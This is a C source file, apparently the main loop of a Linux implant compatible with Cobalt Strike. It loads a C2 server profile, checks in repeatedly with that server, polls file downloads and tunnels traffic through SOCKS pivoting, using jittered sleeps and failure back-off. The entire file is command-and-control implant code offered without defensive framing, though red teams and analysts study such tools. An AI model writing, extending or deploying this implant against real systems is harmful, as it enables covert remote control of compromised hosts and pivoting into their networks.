#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include "beacon.h"
#include "config.h"
#include "profile.h"
#include "debug.h"
#include "files.h"
#include "pivot.h"

#define IMPLANT_VERSION "v2.3.7"

static int running = 1;

// Global beacon state for commands to access
beacon_state_t *g_beacon_state = NULL;

// Global sleep configuration (can be updated by SLEEP command)
int g_sleep_time_ms = SLEEP_TIME;
int g_jitter_percent = JITTER;


// Forward declaration for the callback function in commands.c
void pivot_callback_func(const char * buffer, int length, int type);

void signal_handler(int sig)
{
    (void)sig;
    running = 0;
}

int main(void)
{
    beacon_state_t state;
    
    // Set global beacon state
    g_beacon_state = &state;
    
    // Setup signal handlers
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    if (profile_load() != 0) {
        DEBUG_PRINT("Failed to load profile configuration\n");
        return 1;
    }

    DEBUG_PRINT("Linux Cobalt Strike Beacon %s\n", IMPLANT_VERSION);
    DEBUG_PRINT("C2 Server: %s:%d\n", profile_get_server(), profile_get_port());
    DEBUG_PRINT("Sleep: %dms, Jitter: %d%%\n", g_sleep_time_ms, g_jitter_percent);
    DEBUG_PRINT("HTTPS value: %d\n", profile_get_use_https());
    
    // Initialize beacon
    if (beacon_init(&state) != 0) {
        DEBUG_PRINT("Failed to initialize beacon\n");
        return 1;
    }
    
    pivot_init();
    DEBUG_PRINT("Beacon initialized\n");
    
    // Initial check-in
    DEBUG_PRINT("Starting beacon loop...\n");
        
    int consecutive_failures = 0;

    // Main beacon loop
    while (running)
	{
        download_poll();
        // Check in with server
        if (beacon_checkin(&state) == 0)
		{
            DEBUG_PRINT("Check-in successful (%s)\n", IMPLANT_VERSION);
            consecutive_failures = 0;
        }
        else
        {
            consecutive_failures++;
            int backoff_s = consecutive_failures * 5;
            if (backoff_s > 60) backoff_s = 60;
            
            DEBUG_PRINT("Check-in failed (%d). Backing off for %ds...\n", consecutive_failures, backoff_s);
            
            // Wait for backoff period, but check 'running' flag
            for (int i = 0; i < backoff_s * 10 && running; i++) {
                usleep(100000); // 100ms
            }
            continue; // Skip the rest of the loop and try again
        }

        // Poll SOCKS sockets
        pivot_poll(pivot_callback_func);
        
        
        usleep(10000); // 10ms delay to prevent fast loops
        
        // Sleep with jitter (use global variables)
        if (g_sleep_time_ms < 200) {
            g_sleep_time_ms = 200;
            g_jitter_percent = 0;
        }

        beacon_sleep();
    }
    
    DEBUG_PRINT("\n[*] Shutting down beacon...\n");
    pivot_cleanup();
    beacon_cleanup(&state);
    
    return 0;
}
